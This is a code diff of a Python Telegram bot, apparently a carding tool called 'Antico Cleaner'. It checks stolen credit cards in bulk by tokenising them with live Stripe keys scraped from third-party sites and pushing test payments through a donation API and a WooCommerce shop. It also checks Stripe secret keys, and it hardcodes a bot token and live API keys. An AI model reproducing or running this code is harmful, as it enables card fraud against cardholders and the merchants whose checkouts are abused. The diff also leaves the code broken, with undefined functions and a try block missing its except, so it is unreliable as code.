@@ -21,17 +21,14 @@ from flask import Flask
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # Configure logging
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO
-)
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Initialize Flask app
 app = Flask(__name__)
 
 # Bot token
-BOT_TOKEN = "7646562599:AAFxT8lHyAN7kjxQN737UA1diilkC6v3ai4"
+BOT_TOKEN = "7646562599:AAHfKzz6B2JtRrT5m80ZOGncoyUfcEgzquA"
 
 # API Constants
 STRIPE_PK = "pk_live_sd4VzXOpmDU8DIdWT77qHT1q"
@@ -39,12 +36,9 @@ RANDOM_USER_API = "https://randomuser.me/api/?nat=us"
 BIN_CHECKER_API = "https://bins.antipublic.cc/bins/"
 STRIPE_KEY = "pk_live_51PGzH0CHkCOwzzTu9c6qvusREh4UxRGjldkEitLYyhxzMrXky5loofeHZrMni5bXOG7oTHvJ0eOImw9vlFTRRVjR009dFq9WHT"
 
-# Global variables with thread-safe storage
-USER_SESSIONS = {}  # Stores user-specific check data
-ACTIVE_CHECKS = {}  # Tracks active checks per user
-
-# Thread pool for parallel processing
-CHECK_EXECUTOR = ThreadPoolExecutor(max_workers=50)  # Increased worker count
+# Global variables
+MASS_CHECK_ACTIVE = {}
+USER_SESSIONS = {}
 
 def gets(s, start, end):
     try:
@@ -58,11 +52,9 @@ class CardChecker:
     @staticmethod
     async def check_bin(bin_number: str) -> dict:
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(f"{BIN_CHECKER_API}{bin_number}") as response:
-                    return await response.json()
-        except Exception as e:
-            logger.error(f"BIN check error: {str(e)}")
+            response = requests.get(f"{BIN_CHECKER_API}{bin_number}")
+            return response.json()
+        except:
             return None
 
     @staticmethod
@@ -72,7 +64,7 @@ class CardChecker:
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://js.stripe.com',
             'Referer': 'https://js.stripe.com/',
-            'User-Agent': UserAgent().random,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
             'sec-ch-ua': '"Chromium";v="91", " Not;A Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'Sec-Fetch-Dest': 'empty',
@@ -88,17 +80,10 @@ class CardChecker:
             'time_on_page': '60914',
             'key': STRIPE_PK
         }
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data) as response:
-                    if response.ok:
-                        data = await response.json()
-                        return data.get('id')
-                    return None
-        except Exception as e:
-            logger.error(f"Stripe token error: {str(e)}")
-            return None
+        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
+        if response.ok:
+            return response.json().get('id')
+        return None
 
     @staticmethod
     async def process_payment(token: str, first_name: str, last_name: str) -> dict:
@@ -106,7 +91,6 @@ class CardChecker:
             'Accept': '*/*',
             'Content-Type': 'application/json',
             'Origin': 'https://rhcollaborative.org',
-            'User-Agent': UserAgent().random
         }
         params = {
             'account_id': 'act_f5d15c354806',
@@ -117,18 +101,12 @@ class CardChecker:
         json_data = {
             'first_name': first_name,
             'last_name': last_name,
-            'email': f"{first_name.lower()}{last_name.lower()}@gmail.com",
+            'email': "saimon443@gmail.com",
             'payment_auth': '{"stripe_token":"' + token + '"}',
         }
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post('https://api.donately.com/v2/donations', 
-                                     params=params, headers=headers, json=json_data) as response:
-                    return await response.json()
-        except Exception as e:
-            logger.error(f"Payment processing error: {str(e)}")
-            return {'error': str(e)}
+        response = requests.post('https://api.donately.com/v2/donations', 
+                               params=params, headers=headers, json=json_data)
+        return response.json()
 
     @staticmethod
     async def visit_website(cc_number, exp_month, exp_year, cvc):
@@ -173,7 +151,7 @@ class CardChecker:
                         'Sec-Fetch-Site': 'same-origin',
                         'Sec-Fetch-User': '?1',
                         'Upgrade-Insecure-Requests': '1',
-                        'User-Agent': UserAgent().random,
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                         'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                         'sec-ch-ua-mobile': '?0',
                         'sec-ch-ua-platform': '"Windows"',
@@ -195,10 +173,10 @@ class CardChecker:
                         'wc_order_attribution_utm_creative_format': '(none)',
                         'wc_order_attribution_utm_marketing_tactic': '(none)',
                         'wc_order_attribution_session_entry': 'https://fbsdoors.co.uk/my-account/',
-                        'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'wc_order_attribution_session_start_time': '2025-03-28 09:47:37',
                         'wc_order_attribution_session_pages': '4',
                         'wc_order_attribution_session_count': '3',
-                        'wc_order_attribution_user_agent': UserAgent().random,
+                        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                         'woocommerce-register-nonce': register_nonce,
                         '_wp_http_referer': '/my-account/',
                         'register': 'Register',
@@ -217,7 +195,7 @@ class CardChecker:
                         'Sec-Fetch-Site': 'same-origin',
                         'Sec-Fetch-User': '?1',
                         'Upgrade-Insecure-Requests': '1',
-                        'User-Agent': UserAgent().random,
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                         'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                         'sec-ch-ua-mobile': '?0',
                         'sec-ch-ua-platform': '"Windows"',
@@ -238,7 +216,7 @@ class CardChecker:
                             'Sec-Fetch-Dest': 'empty',
                             'Sec-Fetch-Mode': 'cors',
                             'Sec-Fetch-Site': 'same-site',
-                            'User-Agent': UserAgent().random,
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                             'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                             'sec-ch-ua-mobile': '?0',
                             'sec-ch-ua-platform': '"Windows"',
@@ -252,12 +230,12 @@ class CardChecker:
                             'card[cvc]': cvc,
                             'card[exp_month]': exp_month,
                             'card[exp_year]': exp_year,
-                            'guid': str(uuid.uuid4()),
-                            'muid': str(uuid.uuid4()),
-                            'sid': str(uuid.uuid4()),
+                            'guid': '898e6eeb-ff8f-4729-8aa7-358d648618fdf541cc',
+                            'muid': 'f459b713-d21b-43bb-900c-fafa6bb62dfd776a05',
+                            'sid': '4ac27cf6-cb91-4b18-9e46-e979740c70b8aa4f87',
                             'payment_user_agent': 'stripe.js/5d3c74e219; stripe-js-v3/5d3c74e219; split-card-element',
                             'referrer': 'https://fbsdoors.co.uk',
-                            'time_on_page': str(random.randint(100000, 999999)),
+                            'time_on_page': '608601',
                             'key': STRIPE_KEY,
                         }
 
@@ -277,7 +255,7 @@ class CardChecker:
                                     'Sec-Fetch-Dest': 'empty',
                                     'Sec-Fetch-Mode': 'cors',
                                     'Sec-Fetch-Site': 'same-origin',
-                                    'User-Agent': UserAgent().random,
+                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                                     'X-Requested-With': 'XMLHttpRequest',
                                     'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                                     'sec-ch-ua-mobile': '?0',
@@ -321,7 +299,6 @@ class CardChecker:
                                     'expiry': f'{exp_month}/{exp_year}'
                                 }
         except Exception as e:
-            logger.error(f"Website visit error: {str(e)}")
             return {
                 'status': 'error',
                 'message': str(e),
@@ -398,10 +375,9 @@ class Commands:
 
         if query.data == 'random_user':
             try:
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(RANDOM_USER_API) as response:
-                        data = (await response.json())['results'][0]
-                        user_info = f"""👤 Random User Generated:
+                response = requests.get(RANDOM_USER_API)
+                data = response.json()['results'][0]
+                user_info = f"""👤 Random User Generated:
 ▬▬▬▬▬▬▬▬
 📛 Name: {data['name']['first']} {data['name']['last']}
 📧 Email: {data['email']}
@@ -413,13 +389,13 @@ class Commands:
 🆔 Username: {data['login']['username']}
 🔑 Password: {data['login']['password']}"""
 
-                        keyboard = [
-                            [InlineKeyboardButton("🔄 Generate Another", callback_data='random_user')],
-                            [InlineKeyboardButton("⬅️ Back", callback_data='back')],
-                            [InlineKeyboardButton("❌ Close", callback_data='close')]
-                        ]
-                        reply_markup = InlineKeyboardMarkup(keyboard)
-                        await query.edit_message_text(text=user_info, reply_markup=reply_markup)
+                keyboard = [
+                    [InlineKeyboardButton("🔄 Generate Another", callback_data='random_user')],
+                    [InlineKeyboardButton("⬅️ Back", callback_data='back')],
+                    [InlineKeyboardButton("❌ Close", callback_data='close')]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await query.edit_message_text(text=user_info, reply_markup=reply_markup)
             except Exception as e:
                 await query.edit_message_text(f"Error generating random user: {str(e)}")
 
@@ -450,6 +426,7 @@ class Commands:
         elif query.data == 'close':
             particle_msg = "❄️ ⭐️ 💫 ✨ 🌟\n   Goodbye!\n❄️ ⭐️ 💫 ✨ 🌟"
             await query.edit_message_text(text=particle_msg)
+            # Wait briefly to show animation then delete
             await asyncio.sleep(1)
             await query.message.delete()
         elif query.data == 'back':
@@ -469,11 +446,10 @@ class Commands:
     @staticmethod
     async def generate_random_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(RANDOM_USER_API) as response:
-                    data = (await response.json())['results'][0]
+            response = requests.get(RANDOM_USER_API)
+            data = response.json()['results'][0]
 
-                    user_info = f"""👤 Random User Generated:
+            user_info = f"""👤 Random User Generated:
 ▬▬▬▬▬▬▬▬
 📛 Name: {data['name']['first']} {data['name']['last']}
 📧 Email: {data['email']}
@@ -485,8 +461,8 @@ class Commands:
 🆔 Username: {data['login']['username']}
 🔑 Password: {data['login']['password']}"""
 
-                    msg = update.callback_query.message if update.callback_query else update.message
-                    await msg.reply_text(user_info)
+            msg = update.callback_query.message if update.callback_query else update.message
+            await msg.reply_text(user_info)
         except Exception as e:
             error_msg = f"Error generating random user: {str(e)}"
             msg = update.callback_query.message if update.callback_query else update.message
@@ -504,26 +480,26 @@ class Commands:
             return
 
         try:
+            import base64
             auth = base64.b64encode(sk_key.encode()).decode()
-            headers = {'Authorization': f'Basic {auth}', 'User-Agent': UserAgent().random}
+            headers = {'Authorization': f'Basic {auth}'}
 
-            async with aiohttp.ClientSession() as session:
-                # Get balance info
-                async with session.get('https://api.stripe.com/v1/balance', headers=headers) as balance_response:
-                    balance_data = await balance_response.json()
+            # Get balance info
+            balance_response = requests.get('https://api.stripe.com/v1/balance', headers=headers)
+            balance_data = balance_response.json()
 
-                # Get account info
-                async with session.get('https://api.stripe.com/v1/account', headers=headers) as account_response:
-                    account_data = await account_response.json()
+            # Get account info
+            account_response = requests.get('https://api.stripe.com/v1/account', headers=headers)
+            account_data = account_response.json()
 
-                if 'error' in balance_data or 'error' in account_data:
-                    error_msg = balance_data.get('error', {}).get('message') or account_data.get('error', {}).get('message', 'Invalid SK Key')
-                    await update.message.reply_text(f"[❌] Error → {error_msg}")
-                    return
+            if 'error' in balance_data or 'error' in account_data:
+                error_msg = balance_data.get('error', {}).get('message') or account_data.get('error', {}).get('message', 'Invalid SK Key')
+                await update.message.reply_text(f"[❌] Error → {error_msg}")
+                return
 
-                masked_sk = sk_key[:12] + '_SWDQYL_' + sk_key[-4:]
+            masked_sk = sk_key[:12] + '_SWDQYL_' + sk_key[-4:]
 
-                msg = f"""━━━━━━━━━━━━━━━  
+            msg = f"""━━━━━━━━━━━━━━━  
    𝙎𝙩𝙖𝙩𝙪𝙨 ⌁  
 ━━━━━━━━━━━━━━━  
 
@@ -533,11 +509,11 @@ class Commands:
 🌍 𝙎𝙞𝙩𝙚: {account_data.get('business_profile', {}).get('url', 'N/A')}
 🔢 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝘿: {account_data.get('id', 'N/A')}
 🏳️ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮: {account_data.get('country', 'N/A')}
-💰 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: {balance_data['available'][0]['currency'].upper() if balance_data.get('available') else 'N/A'}
+💰 𝘾𝙪𝙧𝙧𝙚𝙣𝙘𝙮: {balance_data['available'][0]['currency'].upper()}
 📧 𝙈𝙖𝙞𝙡: {account_data.get('email', 'N/A')}
 
-💳 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘽𝙖𝙡𝙖𝙣𝙘𝙚: {balance_data['available'][0]['amount'] if balance_data.get('available') else 'N/A'}
-⏳ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜: {balance_data['pending'][0]['amount'] if balance_data.get('pending') else 'N/A'}
+💳 𝘼𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝘽𝙖𝙡𝙖𝙣𝙘𝙚: {balance_data['available'][0]['amount']}
+⏳ 𝙋𝙚𝙣𝙙𝙞𝙣𝙜: {balance_data['pending'][0]['amount']}
 
 🔹 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙈𝙚𝙩𝙝𝙤𝙙 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('capabilities', {}).get('card_payments') == 'active' else '❌ Inactive'}
 🔹 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙎𝙩𝙖𝙩𝙪𝙨: {'✅ Active' if account_data.get('charges_enabled') else '❌ Inactive'}
@@ -547,21 +523,20 @@ class Commands:
 𝗥𝗲𝗾 𝗯𝘆 ➜ @{update.effective_user.username or 'N/A'}
 ━━━━━━━━━━━━━━━"""
 
-                await update.message.reply_text(msg)
+            await update.message.reply_text(msg)
         except Exception as e:
-            await update.message.reply_text(f"[❌] Error → {str(e)}")
+            await update.message.reply_text("[❌] Error → Invalid SK Key")
 
     @staticmethod
     async def check_card(cc_data: str, update: Update) -> str:
         try:
             number, month, year, cvc = cc_data.split("|")
-            
+
             # Get random user data for the transaction
-            async with aiohttp.ClientSession() as session:
-                async with session.get(RANDOM_USER_API) as response:
-                    user_data = (await response.json())['results'][0]
-                    first_name = user_data['name']['first']
-                    last_name = user_data['name']['last']
+            response = requests.get(RANDOM_USER_API)
+            user_data = response.json()['results'][0]
+            first_name = user_data['name']['first']
+            last_name = user_data['name']['last']
 
             # Get Stripe token
             stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
@@ -571,7 +546,7 @@ class Commands:
             # Process payment
             payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
             result = payment_result.get('message', 'Unknown response')
-            
+
             # Get BIN info
             bin_info = await CardChecker.check_bin(number[:6])
 
@@ -582,7 +557,7 @@ class Commands:
 
 💳 𝗖𝗮𝗿𝗱 ➜ {number}|{month}|{year}|{cvc}
 🚪 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe 1$
-📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in str(result).lower() else '❌'}
+📡 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ {'✅' if 'success' in result.lower() else '❌'}
 ⚡ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result}
 
 ━━━━━━━━━━━━━━━"""
@@ -618,20 +593,12 @@ class Commands:
             return
 
         cc_data = context.args[0]
-        
-        # Send initial processing message
-        processing_msg = await update.message.reply_text("🔄 Processing your card, please wait...")
-        
-        # Run the check in a separate thread
-        loop = asyncio.get_event_loop()
-        result = await loop.run_in_executor(CHECK_EXECUTOR, lambda: asyncio.run(Commands.check_card(cc_data, update)))
-        
-        # Edit the original message with results
-        await context.bot.edit_message_text(
-            chat_id=update.effective_chat.id,
-            message_id=processing_msg.message_id,
-            text=result
-        )
+        result = await Commands.check_card(cc_data, update)
+        await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=result,
+                reply_to_message_id=update.message.message_id
+            )
 
     @staticmethod
     async def validate_card(cc_data: str) -> tuple:
@@ -659,8 +626,6 @@ class Commands:
                 return False, "Invalid CVC length"
 
             return True, (number, month, year, cvc)
-        except Exception as e:
-            return False, str(e)
 
     @staticmethod
     async def svv_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -696,38 +661,36 @@ class Commands:
 
             headers = {
                 "Authorization": f"Bearer {sk}",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "User-Agent": UserAgent().random
+                "Content-Type": "application/x-www-form-urlencoded"
             }
 
-            async with aiohttp.ClientSession() as session:
-                # Create payment method
-                async with session.post(
-                    "https://api.stripe.com/v1/payment_methods",
-                    headers=headers,
-                    data=pm_data
-                ) as pm_response:
-                    if not pm_response.ok:
-                        error = await pm_response.json()
-                        return {"success": False, "message": error.get("error", {}).get("message", "Payment method creation failed")}
+            pm_response = requests.post(
+                "https://api.stripe.com/v1/payment_methods",
+                headers=headers,
+                data=pm_data
+            )
 
-                    pm_id = (await pm_response.json()).get("id")
+            if not pm_response.ok:
+                return {"success": False, "message": pm_response.json().get("error", {}).get("message", "Payment method creation failed")}
 
-                # Create payment intent
-                pi_data = {
-                    "amount": 100,
-                    "currency": "usd",
-                    "payment_method": pm_id,
-                    "confirm": True,
-                    "off_session": True
-                }
+            pm_id = pm_response.json().get("id")
 
-                async with session.post(
-                    "https://api.stripe.com/v1/payment_intents",
-                    headers=headers,
-                    data=pi_data
-                ) as pi_response:
-                    return {"success": True, "response": await pi_response.json()}
+            # Create payment intent
+            pi_data = {
+                "amount": 100,
+                "currency": "usd",
+                "payment_method": pm_id,
+                "confirm": True,
+                "off_session": True
+            }
+
+            pi_response = requests.post(
+                "https://api.stripe.com/v1/payment_intents",
+                headers=headers,
+                data=pi_data
+            )
+
+            return {"success": True, "response": pi_response.json()}
 
         except Exception as e:
             return {"success": False, "message": str(e)}
@@ -768,13 +731,7 @@ class Commands:
                 year = "20" + year
 
             await checking_message.edit_text("⌛ Connecting to Stripe API...")
-            
-            # Run in executor to prevent blocking
-            loop = asyncio.get_event_loop()
-            result = await loop.run_in_executor(
-                CHECK_EXECUTOR,
-                lambda: asyncio.run(Commands.process_stripe_payment(sk, number, month, year, cvc))
-            )
+            result = await Commands.process_stripe_payment(sk, number, month, year, cvc)
 
             if not result["success"]:
                 await checking_message.reply_text(f"❌ ERROR: {result['message']}\n💳 {cc_data}")
@@ -807,8 +764,8 @@ class Commands:
     @staticmethod
     async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         user_id = update.effective_user.id
-        if user_id in ACTIVE_CHECKS:
-            ACTIVE_CHECKS[user_id] = False
+        if user_id in MASS_CHECK_ACTIVE:
+            MASS_CHECK_ACTIVE[user_id] = False
             await update.message.reply_text("🛑 Mass checking operation stopped.")
 
     @staticmethod
@@ -818,151 +775,121 @@ class Commands:
             await update.message.reply_text("Please reply to a file containing cards")
             return
 
-        # Mark this user as active
-        ACTIVE_CHECKS[user_id] = True
-        
-        # Initialize user session
-        USER_SESSIONS[user_id] = {
-            'approved': 0,
-            'declined': 0,
-            'checked': 0,
-            'total': 0
-        }
-
-        # Download the file
         file = await update.message.reply_to_message.document.get_file()
         content = (await file.download_as_bytearray()).decode('utf-8')
         cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
         total_cards = len(cards)
-        USER_SESSIONS[user_id]['total'] = total_cards
 
-        # Create initial status message
-        status_msg = await update.message.reply_text(
-            f"Antico Cleaner\n"
-            f"Total Filtered Cards: {total_cards}\n\n"
-            f"Please Wait Checking Your Cards 🟢\n\n"
-            f"Gate -> Stripe Auth 🟢\n\n"
-            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
-            f"CC • \n\n"
-            f"Status • \n\n"
-            f"APPROVED !✔ • 0\n"
-            f"DECLINED !✔ • 0\n"
-            f"0 / {total_cards} •\n\n"
-            f"Stop Check 🟢",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
-            ])
-        )
+        check_id = str(uuid.uuid4())  # Generate unique ID for this check
 
-        # Process cards asynchronously
-        async def process_card(card):
-            if not ACTIVE_CHECKS.get(user_id, True):
-                return None
-                
-            try:
-                number, month, year, cvc = card.split("|")
-                
-                # Get random user data for the transaction
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(RANDOM_USER_API) as response:
-                        user_data = (await response.json())['results'][0]
-                        first_name = user_data['name']['first']
-                        last_name = user_data['name']['last']
+        if user_id not in USER_SESSIONS:
+            USER_SESSIONS[user_id] = {}
+        USER_SESSIONS[user_id][check_id] = {
+            'approved': 0,
+            'declined': 0,
+            'checked': 0,
+            'total': total_cards,
+            'active': True  # Flag to stop the check
+        }
 
-                # Get Stripe token
-                stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
-                if not stripe_token:
-                    return {'status': 'failed', 'message': 'Could not get token', 'card': card}
+        # Create thread pool with dynamic workers based on system resources
+        max_workers = min(35, (os.cpu_count() or 1) * 5)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = [executor.submit(process_card, card, check_id) for card in cards]
 
-                # Process payment
-                payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
-                result = payment_result.get('message', 'Unknown response')
-                
-                # Check for success keywords
-                success_keywords = [
-                    "succeeded", "success", "Thank you", "approved", "complete", 
-                    "completed", "pass", "Thanks", "successful", "Saved payment method"
-                ]
-                
-                is_success = any(keyword.lower() in str(result).lower() for keyword in success_keywords)
-                
-                return {
-                    'status': 'success' if is_success else 'failed',
-                    'message': result,
-                    'card': card
-                }
-                
-            except Exception as e:
-                return {'status': 'error', 'message': str(e), 'card': card}
+            for future in as_completed(futures):
+                if not USER_SESSIONS[user_id][check_id]['active']:
+                    break
 
-        async def update_status():
-            while ACTIVE_CHECKS.get(user_id, False) and USER_SESSIONS[user_id]['checked'] < total_cards:
-                await asyncio.sleep(1)  # Update every second
-                
-                await context.bot.edit_message_text(
-                    chat_id=update.effective_chat.id,
-                    message_id=status_msg.message_id,
-                    text=(
-                        f"Antico Cleaner\n"
-                        f"Total Filtered Cards: {total_cards}\n\n"
-                        f"Please Wait Checking Your Cards 🟢\n\n"
-                        f"Gate -> Stripe Auth 🟢\n\n"
-                        f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
-                        f"CC • Last checked\n\n"
-                        f"Status • Processing\n\n"
-                        f"APPROVED !✔ • {USER_SESSIONS[user_id]['approved']}\n"
-                        f"DECLINED !✔ • {USER_SESSIONS[user_id]['declined']}\n"
-                        f"{USER_SESSIONS[user_id]['checked']} / {total_cards} •\n\n"
-                        f"Stop Check 🟢"
-                    ),
-                    reply_markup=InlineKeyboardMarkup([
-                        [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
-                    ])
-                )
+                try:
+                    result = future.result()
+                    if result and result.get('status') == 'success':
+                        USER_SESSIONS[user_id][check_id]['approved'] += 1
+                        # Send approved card to user
+                        await context.bot.send_message(
+                            chat_id=update.effective_chat.id,
+                            text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
+                        )
+                    else:
+                        USER_SESSIONS[user_id][check_id]['declined'] += 1
 
-        # Start status updates
-        asyncio.create_task(update_status())
+                    USER_SESSIONS[user_id][check_id]['checked'] += 1
 
-        # Process cards in parallel
-        tasks = []
-        for card in cards:
-            if not ACTIVE_CHECKS.get(user_id, True):
-                break
-                
-            task = asyncio.create_task(process_card(card))
-            tasks.append(task)
-            
-        for task in asyncio.as_completed(tasks):
-            result = await task
-            
-            if not ACTIVE_CHECKS.get(user_id, True):
-                break
-                
-            if result and result.get('status') == 'success':
-                USER_SESSIONS[user_id]['approved'] += 1
-                # Send approved card to user
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text=f"✅ APPROVED CARD\n{result['card']}\nResponse: {result['message']}"
-                )
-            else:
-                USER_SESSIONS[user_id]['declined'] += 1
-            
-            USER_SESSIONS[user_id]['checked'] += 1
+                    # Update status message
+                    await context.bot.edit_message_text(
+                        chat_id=update.effective_chat.id,
+                        message_id=status_msg.message_id,
+                        text=(
+                            f"Antico Cleaner\n"
+                            f"Total Filtered Cards: {total_cards}\n\n"
+                            f"Please Wait Checking Your Cards 🟢\n\n"
+                            f"Gate -> Stripe Auth 🟢\n\n"
+                            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
+                            f"CC • {result.get('card', '')}\n\n"
+                            f"Status • {'APPROVED 🟢' if result and result.get('status') == 'success' else 'DECLINED 🟢'}\n\n"
+                            f"APPROVED !✔ • {USER_SESSIONS[user_id][check_id]['approved']}\n"
+                            f"DECLINED !✔ • {USER_SESSIONS[user_id][check_id]['declined']}\n"
+                            f"{USER_SESSIONS[user_id][check_id]['checked']} / {total_cards} •\n\n"
+                            f"Stop Check 🟢"
+                        ),
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}_{check_id}")]
+                        ])
+                    )
 
-        # Final update
-        if ACTIVE_CHECKS.get(user_id, False):
+                except Exception as e:
+                    continue
+
+        # Final message
+        if USER_SESSIONS[user_id][check_id]['active']:
             await context.bot.edit_message_text(
                 chat_id=update.effective_chat.id,
                 message_id=status_msg.message_id,
                 text=(
                     f"✅ Mass check completed!\n"
-                    f"Approved: {USER_SESSIONS[user_id]['approved']}\n"
-                    f"Declined: {USER_SESSIONS[user_id]['declined']}\n"
+                    f"Approved: {USER_SESSIONS[user_id][check_id]['approved']}\n"
+                    f"Declined: {USER_SESSIONS[user_id][check_id]['declined']}\n"
                     f"Total: {total_cards}"
                 )
             )
-            ACTIVE_CHECKS[user_id] = False
+        USER_SESSIONS[user_id][check_id]['active'] = False
+
+    @staticmethod
+    async def process_mst_card(card, check_id, update, context, user_id, status_msg_id):
+        try:
+            number, month, year, cvc = card.split("|")
+
+            # Get random user data for the transaction
+            response = requests.get(RANDOM_USER_API)
+            user_data = response.json()['results'][0]
+            first_name = user_data['name']['first']
+            last_name = user_data['name']['last']
+
+            # Get Stripe token
+            stripe_token = await CardChecker.get_stripe_token(number, month, year, cvc)
+            if not stripe_token:
+                return {'status': 'failed', 'message': 'Could not get token', 'card': card}
+
+            # Process payment
+            payment_result = await CardChecker.process_payment(stripe_token, first_name, last_name)
+            result = payment_result.get('message', 'Unknown response')
+
+            # Check for success keywords
+            success_keywords = [
+                "succeeded", "success", "Thank you", "approved", "complete", 
+                "completed", "pass", "Thanks", "successful", "Saved payment method"
+            ]
+
+            is_success = any(keyword.lower() in str(result).lower() for keyword in success_keywords)
+
+            return {
+                'status': 'success' if is_success else 'failed',
+                'message': result,
+                'card': card
+            }
+
+        except Exception as e:
+            return {'status': 'error', 'message': str(e), 'card': card}
 
     @staticmethod
     async def mstt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -971,136 +898,108 @@ class Commands:
             await update.message.reply_text("Please reply to a file containing cards")
             return
 
-        # Mark this user as active
-        ACTIVE_CHECKS[user_id] = True
-        
-        # Initialize user session
-        USER_SESSIONS[user_id] = {
-            'approved': 0,
-            'declined': 0,
-            'checked': 0,
-            'total': 0
-        }
-
-        # Download the file
         file = await update.message.reply_to_message.document.get_file()
         content = (await file.download_as_bytearray()).decode('utf-8')
         cards = [line.strip() for line in content.split('\n') if '|' in line.strip()]
         total_cards = len(cards)
-        USER_SESSIONS[user_id]['total'] = total_cards
 
-        # Create initial status message
-        status_msg = await update.message.reply_text(
-            f"Antico Cleaner\n"
-            f"Total Filtered Cards: {total_cards}\n\n"
-            f"Please Wait Checking Your Cards 🟢\n\n"
-            f"Gate -> Stripe Auth 🟢\n\n"
-            f"Programmer -> @OUT_MAN0000 {datetime.now().strftime('%I:%M %p')}\n\n"
-            f"CC • \n\n"
-            f"Status • \n\n"
-            f"APPROVED !✔ • 0\n"
-            f"DECLINED !✔ • 0\n"
-            f"0 / {total_cards} •\n\n"
-            f"Stop Check 🟢",
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("🛑 Stop Check", callback_data=f"stop_check_{user_id}")]
-            ])
-        )
+        check_id = str(uuid.uuid4())  # Generate unique ID for this check
 
-        # Process cards asynchronously
-        async def process_card(card):
-            if not ACTIVE_CHECKS.get(user_id, True):
-                return None
-                
-            try:
-                cc_number, exp_month, exp_year, cvc = card.split('|')
-                result = await CardChecker.visit_website(cc_number, exp_month, exp_year, cvc)
-                
-                # Check for success keywords
-                success_keywords = [
-                    "succeeded", "success", "Thank you", "approved", "complete", 
-                    "completed", "pass", "Thanks", "successful", "Saved payment method"
-                ]
-                
-                is_success = any(keyword.lower() in str(result.get('message', '')).lower() for keyword in success_keywords)
-                
-                return {
-                    'status': 'success' if is_success else 'failed',
-                    'message': result.get('message', 'Unknown response'),
-                    'card': card
-                }
-                
-            except Exception as e:
-                return {'status': 'error', 'message': str(e), 'card': card}
+        if user_id not in USER_SESSIONS:
+            USER_SESSIONS[user_id] = {}
+        USER_SESSIONS[user_id][check_id] = {
+            'approved': 0,
+            'declined': 0,
